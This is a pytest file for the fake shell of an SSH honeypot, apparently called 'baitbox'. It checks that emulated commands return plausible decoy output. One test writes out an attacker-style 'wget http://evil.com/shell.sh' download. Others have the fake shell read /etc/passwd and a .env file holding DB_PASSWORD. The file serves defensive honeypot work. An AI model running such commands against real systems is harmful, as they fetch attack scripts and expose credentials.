"""Tests for the SSH server command handler."""

from __future__ import annotations
import pytest
from unittest.mock import MagicMock, patch
from baitbox.vfs import VirtualFilesystem
from baitbox.sessions import SSHSession
from baitbox.servers.ssh_server import execute_session_command, make_prompt


def make_session(username: str = "root", cwd: str = "/root") -> SSHSession:
    channel = MagicMock()
    transport = MagicMock()
    transport.is_active.return_value = True
    session = SSHSession(
        session_id="test-session-001",
        src_ip="203.0.113.1",
        src_port=54321,
        username=username,
        channel=channel,
        transport=transport,
    )
    session.cwd = cwd
    return session


# ── Basic commands ─────────────────────────────────────────────────────────

def test_pwd(make_session=None):
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/root"
    out, close = execute_session_command(s, "pwd")
    assert b"/root" in out
    assert not close


def test_whoami_root():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "whoami")
    assert b"root" in out


def test_whoami_ubuntu():
    s = SSHSession("x","1.2.3.4",22,"ubuntu",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "whoami")
    assert b"ubuntu" in out


def test_id_root():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "id")
    assert b"uid=0(root)" in out


def test_hostname():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "hostname")
    assert len(out) > 0


def test_uname_a():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "uname -a")
    assert b"Linux" in out
    assert b"x86_64" in out


def test_uptime():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "uptime")
    assert b"up" in out


def test_date():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "date")
    assert len(out) > 5


# ── Exit ──────────────────────────────────────────────────────────────────

def test_exit_closes():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    _, close = execute_session_command(s, "exit")
    assert close


def test_logout_closes():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    _, close = execute_session_command(s, "logout")
    assert close


# ── Filesystem commands ────────────────────────────────────────────────────

def test_ls_root_dir():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/root"
    out, close = execute_session_command(s, "ls")
    assert b"secrets.txt" in out
    assert not close


def test_ls_la_shows_hidden():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/root"
    out, close = execute_session_command(s, "ls -la")
    assert b".bashrc" in out or b".bash_history" in out


def test_cd_valid():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/root"
    out, close = execute_session_command(s, "cd /etc")
    assert s.cwd == "/etc"
    assert not close


def test_cd_invalid():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/root"
    out, close = execute_session_command(s, "cd /nonexistent999")
    assert b"No such file or directory" in out
    assert s.cwd == "/root"  # unchanged


def test_cd_tilde():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/var/www"
    execute_session_command(s, "cd ~")
    assert s.cwd == "/root"


def test_cat_file():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "cat /etc/passwd")
    assert b"root" in out


def test_cat_env_file():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "cat /var/www/html/.env")
    assert b"DB_PASSWORD" in out


def test_cat_nonexistent():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "cat /nonexistent_file")
    assert b"No such file" in out


def test_mkdir_and_ls():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/tmp"
    execute_session_command(s, "mkdir testdir")
    out, close = execute_session_command(s, "ls")
    assert b"testdir" in out


def test_touch_and_cat():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/tmp"
    execute_session_command(s, "touch newfile.txt")
    out, _ = execute_session_command(s, "cat newfile.txt")
    assert out == b""  # empty file


def test_echo_and_cat():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/tmp"
    execute_session_command(s, "echo 'hello world' > greeting.txt")
    out, _ = execute_session_command(s, "cat greeting.txt")
    assert b"hello world" in out


def test_grep():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "grep root /etc/passwd")
    assert b"root" in out


def test_find():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "find /root -name secrets.txt")
    assert b"secrets.txt" in out


# ── Process / System commands ─────────────────────────────────────────────

def test_ps():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "ps")
    assert b"bash" in out


def test_ps_aux():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "ps aux")
    assert b"nginx" in out
    assert b"mysql" in out


def test_env():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "env")
    assert b"SHELL" in out


def test_history():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    execute_session_command(s, "whoami")
    execute_session_command(s, "ls")
    out, _ = execute_session_command(s, "history")
    assert b"whoami" in out
    assert b"ls" in out


def test_netstat():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "netstat -tulpn")
    assert b"LISTEN" in out
    assert b"22" in out


def test_ifconfig():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "ifconfig")
    assert b"eth0" in out


def test_df():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "df")
    assert b"Filesystem" in out


def test_free():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "free")
    assert b"Mem" in out


def test_who():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "who")
    assert b"root" in out


def test_crontab_l():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "crontab -l")
    assert b"SHELL" in out or b"cron" in out.lower()


def test_wget():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    s.cwd = "/tmp"
    out, close = execute_session_command(s, "wget http://evil.com/shell.sh")
    assert b"200 OK" in out
    assert s.vfs.is_file("/tmp/shell.sh")


def test_ping():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "ping 8.8.8.8")
    assert b"PING" in out
    assert b"0% packet loss" in out


def test_nmap():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "nmap localhost")
    assert b"22/tcp" in out


def test_git_log():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "git log")
    assert b"commit" in out


def test_unknown_command():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    out, close = execute_session_command(s, "xyzzy_fake_command_abc")
    assert b"command not found" in out


# ── make_prompt ────────────────────────────────────────────────────────────

def test_make_prompt_root():
    p = make_prompt("/root", "root")
    assert b"~" in p
    assert b"#" in p


def test_make_prompt_other_dir():
    p = make_prompt("/var/www", "root")
    assert b"/var/www" in p
    assert b"#" in p


def test_make_prompt_non_root_user():
    p = make_prompt("/home/ubuntu", "ubuntu")
    assert b"$" in p


# ── Command logging ────────────────────────────────────────────────────────

def test_command_is_logged():
    s = SSHSession("x","1.2.3.4",22,"root",MagicMock(),MagicMock())
    execute_session_command(s, "id")
    execute_session_command(s, "whoami")
    assert len(s.commands) == 2
    assert s.commands[0]["command"] == "id"
    assert s.commands[1]["command"] == "whoami"
